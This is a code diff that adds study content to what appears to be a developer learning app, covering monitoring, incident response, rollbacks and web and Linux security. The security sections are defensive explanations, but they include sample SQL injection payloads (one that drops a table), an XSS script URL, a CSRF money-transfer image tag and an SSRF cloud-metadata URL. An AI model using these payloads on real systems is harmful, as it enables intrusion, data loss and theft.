+• Doesn't index log content — only labels (much cheaper)
+• Pairs with Grafana natively
+• Query language: LogQL (similar to PromQL)
+
+KEY LOG LOCATIONS (Linux):
+/var/log/syslog          General system messages
+/var/log/auth.log        SSH logins, sudo, auth events
+/var/log/nginx/          Nginx access + error logs
+journalctl -u nginx -f   systemd service logs (live)`
+      },
+      {
+        title: "Alerting & On-Call",
+        content: `ALERT ANATOMY (Prometheus AlertManager rule):
+groups:
+- name: myapp
+  rules:
+  - alert: HighErrorRate
+    expr: rate(http_errors_total[5m]) > 0.05
+    for: 5m                    # must be true for 5 mins (avoid flaps)
+    labels:
+      severity: critical
+    annotations:
+      summary: "High error rate on {{ \$labels.instance }}"
+      description: "Error rate is {{ \$value | humanizePercentage }}"
+
+ALERT ROUTING:
+• Alertmanager routes by labels (severity, team, service)
+• Critical → PagerDuty (pages someone immediately)
+• Warning → Slack channel
+• Info → email digest
+
+ON-CALL BEST PRACTICES:
+• Every alert must be actionable — no noisy "just FYI" alerts
+• Each alert needs a runbook (what to do when it fires)
+• Track MTTA (mean time to acknowledge) and MTTR (mean time to resolve)
+• Do postmortems on significant incidents — blameless culture
+• Rotate on-call fairly — burn-out is real
+
+TOOLS: PagerDuty, OpsGenie, Squadcast, Grafana OnCall`
+      },
+    ]
+  },
+  {
+    id: "incident",
+    title: "Incident Response",
+    emoji: "🚨",
+    sections: [
+      {
+        title: "Incident Lifecycle",
+        content: `PHASES:
+1. Detection    — alert fires, user report, or you notice it
+2. Triage       — assess severity and impact
+3. Response     — assemble team, start investigation
+4. Mitigation   — stop the bleeding (rollback, disable feature)
+5. Resolution   — permanent fix
+6. Postmortem   — learn and prevent recurrence
+
+SEVERITY LEVELS (common):
+SEV1 / P1  — total outage, all users affected, revenue impact
+SEV2 / P2  — major feature broken, significant user impact
+SEV3 / P3  — degraded performance, partial impact
+SEV4 / P4  — minor issue, workaround available
+
+RULE #1: Restore service first, investigate second.
+Don't spend 2 hours finding root cause while users are down.
+Rollback first, then figure out why.
+
+COMMUNICATION:
+• Designate one Incident Commander (IC) — owns the incident
+• Status page updates every 15-30 minutes (even if "still investigating")
+• Internal channel: #incident-2024-01-15
+• Stakeholder updates via email/Slack
+• "I don't know yet but I'm investigating" is a valid update`
+      },
+      {
+        title: "First 15 Minutes",
+        content: `Minute 0-2 — Acknowledge & Orient:
+• Acknowledge the alert (stops escalation timer)
+• Open incident channel (#incident or war room)
+• Read the alert: what exactly is broken?
+• Check status page — are other things also failing?
+
+Minute 2-5 — Assess Impact:
+• How many users affected? (metrics: active sessions, error rate)
+• Which regions? All or partial?
+• When did it start? (correlate with recent deploys)
+• Is there a recent deployment? (check deploy log)
+
+Minute 5-10 — Quick Wins:
+• Was something deployed recently? → Roll it back
+• Did a config change go out? → Revert it
+• Check dashboards: CPU/memory/disk spiking?
+• Check logs: obvious errors in the last 10 minutes?
+
+Minute 10-15 — Escalate or Dig:
+• If not resolved → pull in relevant team members
+• Assign roles: IC, comms lead, primary investigator
+• Post first status update to stakeholders
+• Start a timeline doc (what you checked, what you found)
+
+COMMANDS FOR QUICK TRIAGE:
+kubectl get pods --all-namespaces | grep -v Running
+kubectl top nodes
+kubectl top pods
+journalctl -u myapp -n 100 --no-pager
+docker logs --tail=100 container_name`
+      },
+      {
+        title: "Rollback Strategies",
+        content: `APPLICATION ROLLBACK:
+# Kubernetes — previous deployment version
+kubectl rollout undo deployment/myapp
+kubectl rollout undo deployment/myapp --to-revision=3
+kubectl rollout history deployment/myapp    # see versions
+
+# Docker — run previous image tag
+docker pull myapp:v1.2.3
+docker stop current_container
+docker run -d myapp:v1.2.3
+
+# GitHub — revert commit + redeploy
+git revert HEAD
+git push origin main    # triggers CI/CD pipeline
+
+DATABASE ROLLBACK:
+• Schema migrations: run the down migration
+• Data changes: restore from backup
+• Feature flags: disable the flag (no deploy needed)
+• WARNING: not all DB changes are reversible
+
+FEATURE FLAGS:
+• Most powerful rollback tool — instant, no deploy needed
+• Tools: LaunchDarkly, Flagsmith, GrowthBook
+• Pattern: deploy code behind a flag → enable for % of users
+         → if issues → disable flag instantly
+
+TRAFFIC MANAGEMENT:
+• Route 0% to new version (canary rollback)
+• Switch load balancer back to old target group
+• Kubernetes: patch service selector to old deployment`
+      },
+      {
+        title: "Postmortem",
+        content: `A postmortem is a blameless analysis to prevent recurrence.
+
+STRUCTURE:
+1. Summary      — what happened, impact, duration
+2. Timeline     — chronological sequence of events
+3. Root Cause   — the actual underlying cause (not symptoms)
+4. Contributing Factors — what made it worse or possible
+5. Action Items — specific tasks to prevent recurrence
+6. What went well — things that helped during response
+
+BLAMELESS CULTURE:
+• Never blame individuals — blame systems and processes
+• People make mistakes — design systems that tolerate mistakes
+• If someone made an error, ask: why did the system allow it?
+• Goal: psychological safety → people report issues honestly
+
+5 WHYS (root cause technique):
+Why did the site go down? → DB ran out of connections
+Why did DB run out of connections? → Connection pool exhausted
+Why was pool exhausted? → Spike in traffic
+Why wasn't it auto-scaled? → Auto-scaling wasn't configured
+Why not? → No runbook existed for this service type
+Root cause: Missing operational runbook for new service type
+
+ACTION ITEMS must be:
+• Specific (not "improve monitoring")
+• Assigned to a person
+• Have a due date
+• Tracked to completion`
+      },
+      {
+        title: "Memory Leak Diagnosis",
+        content: `SYMPTOMS:
+• Memory grows steadily, never returns to baseline
+• Eventually: OOMKill, container restart, swap usage
+• Grafana: memory graph slopes upward over hours/days
+
+LINUX DIAGNOSIS:
+free -h                          Memory overview
+cat /proc/meminfo                Detailed breakdown
+ps aux --sort=-%mem | head -20   Top memory consumers
+top (press M)                    Sort by memory usage
+pmap -x <PID>                    Memory map of process
+valgrind --leak-check=full ./app  Leak detection (C/C++)
+
+KUBERNETES:
+kubectl top pods                 Current memory usage
+kubectl describe pod <name>      See OOMKill in events
+# Set up Prometheus alert:
+container_memory_usage_bytes{container="myapp"} > 500e6
+
+NODE.JS SPECIFIC:
+node --inspect app.js            Enable Chrome DevTools
+# In DevTools: Memory → Take Heap Snapshot
+# Compare snapshots over time — growing objects = leak
+
+COMMON CAUSES:
+• Event listeners added but never removed
+• Caches that grow without eviction policy
+• Circular references preventing GC
+• DB connection pool not being released
+• Holding references to large objects in closures`
+      },
+    ]
+  },
+  {
     id: "macos",
     title: "macOS",
     emoji: "🍎",
@@ -3637,6 +4890,495 @@ Task manager     Activity Monitor         Task Manager
 Firewall config  System Settings          Windows Defender
 Log viewer       Console.app, log show    Event Viewer
 System repair    Recovery mode (Cmd+R)    Windows RE, sfc /scannow`
+      },
+    ]
+  },
+  {
+    id: "security",
+    title: "Security",
+    emoji: "🔒",
+    sections: [
+      {
+        title: "What is Security & OWASP",
+        content: `WHAT IS APPLICATION SECURITY?
+Application security (AppSec) is the practice of finding and fixing
+weaknesses in software before attackers can exploit them.
+
+Think of it like this:
+You build a house (your app). Security is making sure the doors have
+locks, the windows aren't left open, and you're not hiding the key
+under the doormat. Most breaches don't happen because attackers are
+genius hackers — they happen because someone left a door unlocked.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHAT IS OWASP?
+OWASP (Open Web Application Security Project) is a non-profit that
+publishes the "Top 10" list — the 10 most common and dangerous
+security vulnerabilities found in real web apps.
+
+It's updated every few years based on real data from thousands of
+applications. Knowing it is the baseline for any security interview.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+OWASP TOP 10 (2021) — PLAIN ENGLISH:
+
+A01 Broken Access Control
+     What: A regular user can access admin pages, other users' data,
+     or do things they shouldn't be allowed to do.
+     Example: changing the URL from /user/123 to /user/124 and seeing
+     someone else's private profile.
+     Fix: Check permissions on EVERY request server-side.
+
+A02 Cryptographic Failures
+     What: Sensitive data is exposed because it wasn't encrypted,
+     or was encrypted weakly.
+     Example: passwords stored as plain text in the database. If the
+     DB leaks, every password is immediately readable.
+     Fix: HTTPS everywhere, bcrypt for passwords, AES-256 for data at rest.
+
+A03 Injection
+     What: Attacker inserts malicious code into an input that gets
+     executed by the server (SQL, shell commands, etc.)
+     Example: typing SQL code into a login form to bypass authentication.
+     Fix: parameterized queries, never trust user input.
+
+A04 Insecure Design
+     What: The security problem is baked into the architecture — not
+     a bug you can patch, but a fundamental design flaw.
+     Example: a password reset that sends the new password via email
+     (the problem is the design, not the code).
+     Fix: threat modeling during design phase.
+
+A05 Security Misconfiguration
+     What: The software is fine but it's set up insecurely.
+     Example: leaving default admin/admin credentials, having an S3
+     bucket set to public, showing detailed error messages to users.
+     Fix: hardening checklists, automated scanning.
+
+A06 Vulnerable & Outdated Components
+     What: Your app uses libraries with known security holes.
+     Example: Log4Shell (2021) — a vulnerability in a Java logging
+     library used by millions of apps. Attackers ran code remotely
+     just by sending a crafted log message.
+     Fix: dependency scanning (Snyk, Dependabot), keep libs updated.
+
+A07 Authentication Failures
+     What: Problems with login, sessions, or password handling that
+     let attackers access accounts they shouldn't.
+     Example: no account lockout → attacker tries millions of passwords.
+     Fix: MFA, strong password policy, session expiry.
+
+A08 Software & Data Integrity Failures
+     What: App accepts updates/data without verifying it's legitimate.
+     Example: CI/CD pipeline that pulls and runs code from an
+     unverified source, or npm packages that got hijacked.
+     Fix: verify signatures, pin dependency versions.
+
+A09 Security Logging Failures
+     What: The app doesn't log security events, so you never know
+     you've been breached until it's too late.
+     Example: 1000 failed login attempts with no alert triggered.
+     Fix: log all auth events, monitor and alert on anomalies.
+
+A10 Server-Side Request Forgery (SSRF)
+     What: Attacker tricks your server into making HTTP requests to
+     internal systems that should never be public.
+     Example: an image upload feature that fetches a URL — attacker
+     provides http://169.254.169.254 (AWS metadata) to steal cloud
+     credentials.
+     Fix: validate and allowlist URLs, block internal IP ranges.`
+      },
+      {
+        title: "SQL Injection",
+        content: `WHAT IS SQL INJECTION?
+SQL is the language used to talk to databases: "SELECT * FROM users
+WHERE username = 'garry'". SQL injection happens when an attacker
+sneaks SQL code into an input field, and your app accidentally runs it.
+
+WHY DOES IT EXIST?
+Because developers used to (and sometimes still do) build SQL queries
+by gluing strings together with user input — treating the input as
+trusted code instead of untrusted data.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+HOW IT WORKS — STEP BY STEP:
+
+The developer wrote this login query:
+  "SELECT * FROM users WHERE username = '" + username + "'"
+
+Normal use — user types: garry
+  SELECT * FROM users WHERE username = 'garry'   ✅ Works fine
+
+Attack — user types: garry' OR '1'='1' --
+  SELECT * FROM users WHERE username = 'garry' OR '1'='1' --'
+
+Breaking it down:
+  garry'       closes the original string
+  OR '1'='1'   adds a condition that is ALWAYS true
+  --           comments out the rest of the query (including password check)
+
+Result: returns ALL users. Login bypassed. Attacker is in.
+
+Even worse payload:
+  '; DROP TABLE users; --
+  Deletes your entire users table.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+THE FIX — PARAMETERIZED QUERIES:
+Instead of gluing strings, you pass values separately.
+The database treats them as DATA, never as CODE.
+
+❌ Vulnerable (string concatenation):
+  query = "SELECT * FROM users WHERE username = '" + username + "'"
+
+✅ Safe (parameterized):
+  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+Why it works: even if the user types garry' OR '1'='1' --, the
+database sees it as a literal username string, not SQL code.
+
+OTHER FIXES:
+• Use an ORM (Django, SQLAlchemy) — safe by default
+• Least privilege: app DB user should only have SELECT/INSERT, not DROP
+• WAF (Web Application Firewall) — blocks common SQLi patterns as backup`
+      },
+      {
+        title: "XSS & CSRF",
+        content: `WHAT IS XSS (Cross-Site Scripting)?
+XSS is when an attacker injects JavaScript into a web page that other
+users then load in their browser. The browser thinks it's legitimate
+code from your site and runs it — with full access to that user's
+session and cookies.
+
+WHY DOES IT EXIST?
+Browsers trust and execute any JavaScript that comes from a page.
+If an attacker can get their JS into your page, the browser has no
+way to know it wasn't supposed to be there.
+
+TYPES:
+Stored XSS   — attacker saves malicious script to your database
+               (e.g. in a comment, profile bio, forum post)
+               Every user who views that content runs the script.
+
+Reflected XSS — script is in a URL parameter that gets echoed back
+               Example: /search?q=<script>steal()</script>
+               Attacker sends the victim this crafted link.
+
+IMPACT: steal session cookies → log in AS the victim, keylog passwords,
+redirect to phishing sites, deface the page.
+
+FIX:
+• Output encoding: before displaying user content in HTML, escape:
+  < becomes &lt;   > becomes &gt;   " becomes &quot;
+• React does this automatically (dangerouslySetInnerHTML is the danger!)
+• Content Security Policy (CSP) header blocks inline scripts
+• HttpOnly cookie flag: prevents JS from reading session cookies
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHAT IS CSRF (Cross-Site Request Forgery)?
+CSRF tricks a logged-in user's browser into making a request to a site
+they're authenticated on — without the user knowing or clicking anything.
+
+HOW IT WORKS:
+1. You log into bank.com — your browser stores a session cookie
+2. You visit evil.com which contains a hidden image tag:
+   <img src="https://bank.com/transfer?to=attacker&amount=5000">
+3. Your browser automatically sends that request to bank.com
+4. Since you're logged in, bank.com trusts it and transfers the money
+
+The attacker never needed your password — just your active session.
+
+FIX:
+• CSRF token: server gives each form a secret random token.
+  Request is only valid if it includes the right token.
+  Attacker doesn't know the token → their request is rejected.
+• SameSite=Strict cookie: browser won't send the cookie on
+  cross-site requests at all. Simplest modern fix.
+• Check Origin header: reject requests that didn't come from your domain.`
+      },
+      {
+        title: "Authentication & Passwords",
+        content: `WHAT IS AUTHENTICATION?
+Authentication = proving who you are. It's the "logging in" part.
+Authorization = what you're allowed to do once logged in.
+People mix these up all the time — knowing the difference matters.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHY YOU CAN'T STORE PASSWORDS AS PLAIN TEXT:
+If your database is ever leaked (and it happens), every user's
+password is immediately exposed — and since people reuse passwords,
+the attacker now has access to their email, bank, everything.
+
+HOW PASSWORD HASHING WORKS:
+Instead of storing the password, you store a "hash" — a scrambled
+version that can't be reversed. When the user logs in, you hash what
+they typed and compare it to the stored hash.
+
+The key is using a SLOW hash function:
+❌ MD5, SHA1 — designed to be fast. An attacker can try BILLIONS
+   of passwords per second. Your entire database cracks in minutes.
+✅ bcrypt — artificially slow. Takes ~100ms per hash. Attacker can
+   only try ~10 passwords per second. 10 billion times harder to crack.
+✅ Argon2 — even better, memory-hard (can't be sped up with GPUs)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+MFA — MULTI-FACTOR AUTHENTICATION:
+A password alone can be stolen (phishing, data breach, shoulder surfing).
+MFA requires a second proof of identity:
+
+Something you know  → password
+Something you have  → phone with authenticator app, YubiKey hardware key
+Something you are   → fingerprint, Face ID
+
+TOTP (the 6-digit code in Google Authenticator):
+• Your phone and the server share a secret key
+• Both use: secret + current time → generate the same 6-digit code
+• Code changes every 30 seconds
+• Even if someone steals your password, they can't log in without
+  the code from your phone
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SESSION COOKIES — THE RIGHT FLAGS:
+After login, the server gives the browser a session cookie.
+These flags protect it:
+
+HttpOnly   — JavaScript CANNOT read this cookie.
+             Prevents XSS from stealing it.
+Secure     — Cookie only sent over HTTPS, never HTTP.
+             Prevents interception on unsecured networks.
+SameSite=Strict — Cookie not sent on requests from other sites.
+             Prevents CSRF attacks.`
+      },
+      {
+        title: "Network Security",
+        content: `WHAT IS A FIREWALL?
+A firewall is a gatekeeper that sits between your network and the
+outside world. It inspects traffic and decides: let this through or block it.
+
+Think of it like a bouncer at a club — they check every person
+(packet) against a list of rules before letting them in.
+
+TYPES — from simple to smart:
+
+Packet Filter (Stateless)
+  Looks at each packet in isolation: source IP, destination IP, port.
+  Like a bouncer who only checks if your name is on a list.
+  Fast but dumb — doesn't know if a packet is part of a real connection.
+  Example: basic router ACLs, AWS NACLs
+
+Stateful Firewall
+  Tracks the full conversation (connection state).
+  Knows if a packet is part of an established connection or suspicious.
+  Like a bouncer who remembers you came in earlier and lets you back in.
+  Example: AWS Security Groups, Windows Firewall, iptables
+
+Application Firewall (Layer 7)
+  Understands the actual content — HTTP requests, DNS queries, etc.
+  Can block based on URLs, HTTP methods, payload content.
+
+WAF (Web Application Firewall)
+  Specialized for web traffic. Blocks SQLi, XSS, and other web attacks.
+  Sits in front of your web server. Example: Cloudflare WAF, AWS WAF.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHAT IS TLS/HTTPS?
+TLS (Transport Layer Security) encrypts data in transit so that
+anyone intercepting the traffic sees gibberish instead of your data.
+
+HTTP  = plain text. Anyone on the network can read it.
+HTTPS = HTTP + TLS encryption. Traffic is encrypted end-to-end.
+
+Without HTTPS, on public WiFi someone could see your passwords,
+session cookies, and everything you submit to a website.
+
+TLS versions:
+• TLS 1.3 — current, fastest, most secure (2018+)
+• TLS 1.2 — still acceptable
+• TLS 1.0/1.1, SSLv3 — BROKEN, must be disabled
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WHAT IS NETWORK SEGMENTATION?
+Splitting a network into separate zones so that if one zone is
+compromised, the attacker can't freely move to others.
+
+Example zones:
+• DMZ (public-facing) — web servers, load balancers
+• Internal — app servers, databases (never reachable from internet)
+• Management — SSH access, monitoring (restricted to VPN only)
+
+Zero Trust: "never trust, always verify" — even traffic inside your
+own network needs to authenticate. Don't assume internal = safe.`
+      },
+      {
+        title: "Linux Hardening",
+        content: `WHAT IS HARDENING?
+Hardening means reducing the "attack surface" — the number of ways
+an attacker could get in. A fresh server install has a lot of things
+enabled by default that you probably don't need. Hardening turns off
+what isn't needed and tightens what remains.
+
+Think of it like: you moved into a new house (server). Hardening is
+changing the locks, closing windows you don't use, and not leaving
+a spare key under the doormat.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+KEEP EVERYTHING UPDATED:
+Most real-world attacks exploit known vulnerabilities — ones that
+already have patches available. Keeping packages updated closes
+the majority of known attack vectors.
+
+apt update && apt upgrade -y          Update all packages
+# Enable automatic security updates:
+apt install unattended-upgrades
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SSH HARDENING:
+SSH is the main way into your server. If it's misconfigured,
+it's the main way an attacker gets in too.
+
+Edit /etc/ssh/sshd_config:
+PermitRootLogin no         Root is the most powerful account.
+                           Never let anyone SSH directly as root.
+PasswordAuthentication no  Password = guessable, phishable, brutable.
+                           SSH keys = cryptographic, much harder to steal.
+AllowUsers garry deploy    Whitelist — only these users can SSH at all.
+MaxAuthTries 3             After 3 wrong attempts, connection closes.
+
+Why disable password auth?
+Attackers run bots that constantly try common passwords against port 22.
+With key-based auth, even a correct password gets rejected.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+UFW FIREWALL — DEFAULT DENY:
+The safest firewall rule: block everything, then only open what you need.
+
+ufw default deny incoming     Block all inbound by default
+ufw default allow outgoing    Allow all outbound (your server can reach out)
+ufw allow 22/tcp              Allow SSH
+ufw allow 443/tcp             Allow HTTPS
+ufw enable                    Turn it on
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+FAIL2BAN — AUTOMATIC ATTACK BLOCKING:
+Fail2ban watches log files for repeated failures and automatically
+bans the offending IP address for a set amount of time.
+
+Without it: attacker can try millions of SSH passwords forever.
+With it: after 3 failures → IP banned for 1 hour.
+
+apt install fail2ban
+# /etc/fail2ban/jail.local:
+[sshd]
+enabled  = true
+maxretry = 3        # bans after 3 failed attempts
+bantime  = 3600     # banned for 1 hour (3600 seconds)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SUID FILES — A PRIVILEGE ESCALATION RISK:
+SUID (Set User ID) is a file permission that lets a file run AS its
+owner regardless of who executes it. If a SUID file owned by root
+has a vulnerability, any user can exploit it to get root access.
+
+find / -perm -4000 2>/dev/null    Find all SUID files on the system
+# Investigate any unexpected ones — legitimate SUID files are few`
+      },
+      {
+        title: "Security in CI/CD & Cloud",
+        content: `WHY CI/CD SECURITY MATTERS:
+Your CI/CD pipeline has elevated access — it builds, pushes images,
+and deploys to production. If an attacker compromises your pipeline,
+they can push malicious code straight to prod without anyone noticing.
+The pipeline is a high-value target.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SECRETS — THE #1 MISTAKE:
+A "secret" is anything that grants access: passwords, API keys,
+database connection strings, private keys, tokens.
+
+The most common mistake: committing secrets to Git.
+Once in Git history, a secret is considered permanently compromised —
+even if you delete it later. Git history is forever.
+
+Real incident: developer pushes AWS keys to a public GitHub repo.
+Within minutes, automated bots find it and start spinning up
+hundreds of servers for crypto mining. Bill: $50,000.
+
+❌ Never do this:
+  DB_PASSWORD="mysecret123"  # in your code
+  ENV DB_PASSWORD=mysecret   # in your Dockerfile
+
+✅ Do this instead:
+  • Store in GitHub Secrets → reference as \${{ secrets.DB_PASSWORD }}
+  • Use AWS Secrets Manager / GCP Secret Manager at runtime
+  • Inject via environment variables, never baked into the image
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+DEPENDENCY VULNERABILITIES:
+Your app uses dozens/hundreds of third-party libraries. Any one of
+them could have a known vulnerability (CVE).
+
+Log4Shell (2021): A bug in Log4j, a Java logging library. Attacker
+sends a crafted string in ANY log message and gets remote code
+execution on your server. It affected millions of apps worldwide.
+
+How to protect yourself:
+npm audit                    Scan Node.js dependencies
+pip-audit                    Scan Python dependencies
+trivy image myapp:latest     Scan Docker image for vulnerabilities
+snyk test                    Multi-language, integrates into CI
+
+Run these in your CI pipeline so every pull request is scanned.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+CONTAINER SECURITY:
+Containers run as root by default — if an attacker escapes the
+container, they have root on the host. Always run as a non-root user:
+
+# In Dockerfile:
+RUN adduser --disabled-password --gecos '' appuser
+USER appuser    # all subsequent commands + runtime run as appuser
+
+Other container rules:
+• Use minimal base images (alpine, distroless) — fewer packages = fewer vulnerabilities
+• Never use --privileged flag in production
+• Scan images before pushing to registry
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SHIFT LEFT — CATCH BUGS EARLY:
+"Shift left" means moving security checks earlier in the development
+process. Fixing a bug in development costs much less than fixing a
+breach in production.
+
+SAST (Static Analysis) — scans your source code without running it:
+  SonarQube, Semgrep, CodeQL (GitHub)
+  Catches: hardcoded secrets, SQL injection patterns, insecure functions
+
+DAST (Dynamic Analysis) — tests your running application:
+  OWASP ZAP — fires real HTTP attacks at your app
+  Catches: runtime vulnerabilities, misconfigurations
+
+Secret scanning — scans commits for leaked credentials:
+  GitHub secret scanning (built-in, free)
+  truffleHog, git-secrets`
       },
     ]
   },
